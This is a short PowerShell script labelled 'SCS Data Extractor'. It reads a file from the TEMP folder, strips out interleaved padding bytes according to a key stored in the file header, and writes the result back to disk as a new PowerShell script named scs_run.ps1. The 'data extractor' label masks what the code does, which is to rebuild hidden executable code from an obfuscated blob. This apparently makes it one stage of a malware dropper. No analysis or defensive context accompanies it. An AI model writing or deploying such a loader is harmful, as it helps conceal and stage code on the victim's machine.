# SCS Data Extractor
$inp="$env:TEMP\scs_in.dat"
$run="$env:TEMP\scs_run.ps1"
$bytes=[IO.File]::ReadAllBytes($inp)
$iv=[int]$bytes[2]
$out=New-Object System.Collections.Generic.List[byte]
for($i=4;$i-lt$bytes.Length;$i++){if(($i-4)%($iv+1)-ne$iv){$out.Add($bytes[$i])}}
[IO.File]::WriteAllBytes($run,$out.ToArray())
